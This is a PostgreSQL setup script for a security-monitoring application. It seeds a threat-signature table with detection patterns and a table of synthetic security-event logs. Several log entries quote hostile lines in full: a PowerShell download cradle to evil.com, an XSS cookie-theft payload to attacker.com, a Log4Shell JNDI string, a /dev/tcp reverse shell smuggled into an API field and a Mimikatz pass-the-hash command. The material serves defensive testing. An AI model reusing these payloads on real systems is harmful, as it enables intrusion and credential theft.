-- CyberShield Database Initialization Script
-- Run this against the 'cybershield' database after creation
-- Compatible with PostgreSQL 15+

-- ============================================================
-- Tables
-- ============================================================

CREATE TABLE IF NOT EXISTS security_events (
    id BIGSERIAL PRIMARY KEY,
    event_id VARCHAR(64) NOT NULL UNIQUE,
    source VARCHAR(255) NOT NULL,
    severity VARCHAR(20) NOT NULL CHECK (severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
    type VARCHAR(100) NOT NULL,
    description TEXT,
    raw_data TEXT,
    event_timestamp TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_security_events_severity ON security_events(severity);
CREATE INDEX IF NOT EXISTS idx_security_events_type ON security_events(type);
CREATE INDEX IF NOT EXISTS idx_security_events_timestamp ON security_events(event_timestamp DESC);

CREATE TABLE IF NOT EXISTS threat_signatures (
    id BIGSERIAL PRIMARY KEY,
    signature_id VARCHAR(64) NOT NULL UNIQUE,
    name VARCHAR(255) NOT NULL,
    pattern TEXT NOT NULL,
    category VARCHAR(100) NOT NULL,
    severity VARCHAR(20) NOT NULL CHECK (severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
    description TEXT,
    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_threat_signatures_category ON threat_signatures(category);

CREATE TABLE IF NOT EXISTS analysis_executions (
    id BIGSERIAL PRIMARY KEY,
    execution_id VARCHAR(64) NOT NULL UNIQUE,
    algorithm_id VARCHAR(64) NOT NULL,
    module VARCHAR(10) NOT NULL,
    status VARCHAR(30) NOT NULL DEFAULT 'PENDING',
    input_summary TEXT,
    execution_time_nanos BIGINT,
    comparison_count BIGINT,
    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
    completed_at TIMESTAMP WITH TIME ZONE
);

CREATE INDEX IF NOT EXISTS idx_executions_algorithm ON analysis_executions(algorithm_id);
CREATE INDEX IF NOT EXISTS idx_executions_status ON analysis_executions(status);
CREATE INDEX IF NOT EXISTS idx_executions_created ON analysis_executions(created_at DESC);

CREATE TABLE IF NOT EXISTS analysis_findings (
    id BIGSERIAL PRIMARY KEY,
    execution_id VARCHAR(64) NOT NULL,
    finding_type VARCHAR(100) NOT NULL,
    description TEXT,
    severity VARCHAR(20),
    evidence TEXT,
    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
    FOREIGN KEY (execution_id) REFERENCES analysis_executions(execution_id) ON DELETE CASCADE
);

CREATE INDEX IF NOT EXISTS idx_findings_execution ON analysis_findings(execution_id);

CREATE TABLE IF NOT EXISTS benchmark_results (
    id BIGSERIAL PRIMARY KEY,
    algorithm_id VARCHAR(64) NOT NULL,
    input_size BIGINT NOT NULL,
    median_time_nanos BIGINT NOT NULL,
    min_time_nanos BIGINT,
    max_time_nanos BIGINT,
    std_dev_nanos BIGINT,
    comparison_count BIGINT,
    warmup_rounds INTEGER NOT NULL DEFAULT 5,
    trial_rounds INTEGER NOT NULL DEFAULT 10,
    methodology TEXT,
    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_benchmark_algorithm ON benchmark_results(algorithm_id);
CREATE INDEX IF NOT EXISTS idx_benchmark_created ON benchmark_results(created_at DESC);

-- ============================================================
-- Sample Seed Data (clearly labeled as synthetic/educational)
-- ============================================================

-- Threat Signatures (real malware/attack patterns for educational use)
INSERT INTO threat_signatures (signature_id, name, pattern, category, severity, description) VALUES
('SIG-001', 'EICAR Test Signature', 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', 'MALWARE_TEST', 'LOW', 'Standard antivirus test signature (EICAR). Non-malicious.'),
('SIG-002', 'SQL Injection - OR 1=1', 'OR 1=1', 'SQL_INJECTION', 'HIGH', 'Classic SQL injection bypass pattern'),
('SIG-003', 'SQL Injection - UNION SELECT', 'UNION SELECT', 'SQL_INJECTION', 'HIGH', 'SQL UNION-based injection for data exfiltration'),
('SIG-004', 'XSS Script Tag', '<script>', 'XSS', 'HIGH', 'Cross-site scripting script injection'),
('SIG-005', 'XSS Alert', 'alert(', 'XSS', 'MEDIUM', 'XSS alert function injection'),
('SIG-006', 'Path Traversal', '../etc/passwd', 'PATH_TRAVERSAL', 'HIGH', 'Directory traversal to access system files'),
('SIG-007', 'Null Byte Injection', '%00', 'INJECTION', 'MEDIUM', 'Null byte injection for file handling bypass'),
('SIG-008', 'Base64 Encoded Payload', 'eval(base64_decode', 'OBFUSCATION', 'HIGH', 'PHP eval with base64 decode - common webshell pattern'),
('SIG-009', 'Mirai Botnet C2', 'mirai.botnet.c2', 'BOTNET', 'CRITICAL', 'Mirai IoT botnet command and control pattern'),
('SIG-010', 'WannaCry Ransomware', 'WANNACRY', 'RANSOMWARE', 'CRITICAL', 'WannaCry ransomware signature pattern'),
('SIG-011', 'Log4Shell Pattern', '${jndi:ldap://', 'RCE', 'CRITICAL', 'Log4Shell (CVE-2021-44228) JNDI injection pattern'),
('SIG-012', 'Shell Command Injection', '; /bin/sh', 'COMMAND_INJECTION', 'CRITICAL', 'Shell command injection via semicolon'),
('SIG-013', 'PowerShell Download Cradle', 'IEX(New-Object Net.WebClient)', 'POWERSHELL_ATTACK', 'HIGH', 'PowerShell download and execute pattern'),
('SIG-014', 'Heartbleed Pattern', 'type=2 length=0x4000', 'HEARTBLEED', 'CRITICAL', 'OpenSSL Heartbleed (CVE-2014-0160) probe pattern'),
('SIG-015', 'HTTP Admin Path Scan', '/admin', 'RECONNAISSANCE', 'LOW', 'Admin path access attempt')
ON CONFLICT (signature_id) DO NOTHING;

-- Sample Security Events (synthetic - clearly labeled)
INSERT INTO security_events (event_id, source, severity, type, description, raw_data, event_timestamp) VALUES
('EVT-2026-001', '192.168.1.105', 'HIGH', 'INTRUSION_ATTEMPT', 'Multiple failed SSH login attempts from external IP', 'Oct 13 22:00:01 server sshd[1234]: Failed password for root from 192.168.1.105 port 54321', NOW() - INTERVAL '2 hours'),
('EVT-2026-002', '10.0.0.45', 'CRITICAL', 'MALWARE_DETECTED', 'Suspicious PowerShell execution with download cradle', 'EventID=4688 Process=powershell.exe CommandLine=IEX(New-Object Net.WebClient).DownloadString(http://evil.com/payload)', NOW() - INTERVAL '90 minutes'),
('EVT-2026-003', '172.16.0.12', 'MEDIUM', 'POLICY_VIOLATION', 'USB mass storage device connected outside policy hours', 'DeviceType=USB_MASS_STORAGE DeviceID=VID_0930:PID_6545 User=jsmith Time=22:15', NOW() - INTERVAL '75 minutes'),
('EVT-2026-004', '192.168.0.200', 'HIGH', 'SQL_INJECTION', 'SQL injection attempt in login form', 'POST /login HTTP/1.1 body=username=admin'' OR 1=1--&password=anything', NOW() - INTERVAL '60 minutes'),
('EVT-2026-005', '10.0.0.87', 'LOW', 'RECONNAISSANCE', 'Port scan detected from internal host', 'Nmap scan: TCP SYN scan ports 1-65535 from 10.0.0.87 to 192.168.1.0/24', NOW() - INTERVAL '55 minutes'),
('EVT-2026-006', '203.0.113.42', 'CRITICAL', 'LOG4SHELL', 'Log4Shell exploitation attempt detected in HTTP header', 'GET / HTTP/1.1 User-Agent: ${jndi:ldap://203.0.113.42:1389/Exploit}', NOW() - INTERVAL '50 minutes'),
('EVT-2026-007', '192.168.1.23', 'HIGH', 'RANSOMWARE', 'Suspicious file encryption activity - ransomware indicators', 'Process vssadmin.exe deleted shadow copies; 500 files renamed with .LOCKED extension', NOW() - INTERVAL '45 minutes'),
('EVT-2026-008', '10.0.0.156', 'MEDIUM', 'AUTH_FAILURE', 'Account lockout after repeated failed authentication', 'EventID=4740 Account: serviceacct FailedAttempts=5 LockoutThreshold=5', NOW() - INTERVAL '40 minutes'),
('EVT-2026-009', '172.16.0.88', 'HIGH', 'LATERAL_MOVEMENT', 'Pass-the-Hash attack detected using stolen NTLM hash', 'Mimikatz detected: sekurlsa::pth /user:Administrator /domain:CORP /ntlm:aad3b435b51404eeaad3b435', NOW() - INTERVAL '35 minutes'),
('EVT-2026-010', '192.168.0.112', 'LOW', 'ANOMALY', 'Unusual data transfer volume to cloud storage', 'User: mwilson Data uploaded to S3: 2.3 GB (normal: 50 MB/day)', NOW() - INTERVAL '30 minutes'),
('EVT-2026-011', '10.0.0.33', 'MEDIUM', 'XSS_ATTEMPT', 'Reflected XSS in search parameter', 'GET /search?q=<script>document.location=http://attacker.com/cookie?c=+document.cookie</script>', NOW() - INTERVAL '25 minutes'),
('EVT-2026-012', '192.168.1.78', 'HIGH', 'PATH_TRAVERSAL', 'Directory traversal attempt to access /etc/passwd', 'GET /view?file=../../../etc/passwd HTTP/1.1 Source: 192.168.1.78', NOW() - INTERVAL '20 minutes'),
('EVT-2026-013', '10.0.0.201', 'CRITICAL', 'BOTNET', 'Mirai botnet C2 communication detected', 'DNS query: mirai.botnet.c2.example.com Destination: 185.220.101.45 Protocol: UDP/4433', NOW() - INTERVAL '15 minutes'),
('EVT-2026-014', '172.16.0.55', 'MEDIUM', 'PRIVILEGE_ESCALATION', 'Sudo privilege escalation to root detected', 'User operator executed: sudo -u root /bin/bash from non-admin workstation', NOW() - INTERVAL '10 minutes'),
('EVT-2026-015', '192.168.0.77', 'LOW', 'POLICY_VIOLATION', 'Login outside normal business hours', 'User: bthompson Login at: 03:42 AM Normal hours: 08:00-18:00', NOW() - INTERVAL '8 minutes'),
('EVT-2026-016', '10.0.0.99', 'HIGH', 'COMMAND_INJECTION', 'Command injection attempt in API parameter', 'POST /api/ping body={"host": "localhost; /bin/sh -i >& /dev/tcp/10.0.0.99/4444 0>&1"}', NOW() - INTERVAL '6 minutes'),
('EVT-2026-017', '192.168.1.11', 'MEDIUM', 'AUTH_FAILURE', 'Brute force attack on web application login', '42 failed login attempts in 60 seconds from 192.168.1.11 to /login', NOW() - INTERVAL '5 minutes'),
('EVT-2026-018', '172.16.0.100', 'HIGH', 'DATA_EXFILTRATION', 'Large DNS TXT record queries - possible DNS tunneling', 'DNS TXT queries averaging 240 bytes each, 350 queries in 5 minutes from host-100', NOW() - INTERVAL '4 minutes'),
('EVT-2026-019', '10.0.0.250', 'LOW', 'RECONNAISSANCE', 'Web application fingerprinting detected', 'GET /robots.txt, /sitemap.xml, /.git/config, /wp-admin HTTP/1.1 UA: Nikto/2.1.6', NOW() - INTERVAL '3 minutes'),
('EVT-2026-020', '192.168.0.35', 'CRITICAL', 'RANSOMWARE', 'WannaCry ransomware network propagation attempt', 'SMB EternalBlue exploit attempt to port 445; WANNACRY signature matched in payload', NOW() - INTERVAL '2 minutes')
ON CONFLICT (event_id) DO NOTHING;
